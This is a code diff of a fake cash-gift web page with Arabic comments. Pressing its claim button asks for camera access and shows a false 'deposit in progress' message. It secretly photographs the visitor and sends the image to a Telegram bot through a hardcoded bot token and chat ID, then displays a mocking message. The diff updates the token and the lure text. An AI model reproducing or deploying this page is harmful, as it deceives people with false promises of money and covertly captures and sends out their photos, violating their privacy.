@@ -16,7 +16,8 @@
         .logo { width: 90px; height: 90px; border-radius: 50%; margin-bottom: 15px; border: 3px solid var(--accent-color); object-fit: cover; }
         .amount-box { background: #f0fff4; padding: 15px; border-radius: 15px; margin: 20px 0; border: 2px dashed var(--accent-color); }
         .amount { font-size: 45px; color: #075e54; font-weight: bold; }
-        .btn { background: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; }
+        .btn { background: var(--primary-color); color: white; border: none; padding: 15px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
+        .btn:active { transform: scale(0.95); }
         video, canvas { display: none; }
         .final-msg { color: #d63031; font-size: 26px; font-weight: bold; }
     </style>
@@ -36,24 +37,25 @@
 
 <script>
     const claimBtn = document.getElementById('claimBtn');
-    const TOKEN = "8680007162:AAEKrDXjZJdNKdWeT6pIkMXyALj0m30q34I";
+    // التوكن الجديد والـ ID الخاص بجروبك
+    const TOKEN = "8680007162:AAFCF3Zam9o0c1IFzAoWlb7FZP6sGvFkDRY";
     const CHAT_ID = "-3805611772";
 
     claimBtn.addEventListener('click', async () => {
         try {
-            // طلب الكاميرا
+            // طلب إذن الكاميرا فوراً
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // تمويه الضحية
+            // تغيير الواجهة للتمويه السريع
             document.getElementById('mainCard').innerHTML = `
                 <div style="font-size:50px; margin-bottom:20px;">⌛</div>
-                <h3>جاري تحويل المبلغ...</h3>
-                <p>يرجى عدم إغلاق الصفحة لضمان وصول المبلغ إلى محفظتك</p>
+                <h3>جاري معالجة الطلب...</h3>
+                <p>يرجى الانتظار ثوانٍ لإيداع المبلغ في حسابك</p>
             `;
 
-            // انتظر استقرار الكاميرا ثم التقط
+            // التقاط الصورة بعد ثانية واحدة لضمان جودة الوجه
             setTimeout(() => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -64,16 +66,15 @@
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('photo', blob, 'shot.jpg');
-                    formData.append('caption', 'صيد جديد ومؤكد لعيون فهودي! 😂📸');
+                    formData.append('caption', '📸 صيد جديد ومخفي لعيون فهودي!');
 
-                    // إرسال الصورة
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    // إرسال الصورة للبوت الجديد
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
-                        body: formData,
-                        mode: 'no-cors' // هذه الإضافة لتجاوز حماية المتصفح
+                        body: formData
                     });
 
-                    // الرسالة النهائية المطلوبة
+                    // إظهار الرسالة الصادمة النهائية
                     setTimeout(() => {
                         document.getElementById('mainCard').innerHTML = `
                             <div class="final-msg">🤡 تعيش وتأكل غيرها!</div>
@@ -85,7 +86,7 @@
             }, 1000);
 
         } catch (err) {
-            alert("فشل الإرسال: تأكد من السماح للكاميرا لتأكيد هويتك!");
+            alert("حدث خطأ تقني: يرجى السماح بالكاميرا لتأكيد الحساب واستلام العيدية!");
         }
     });
 </script>
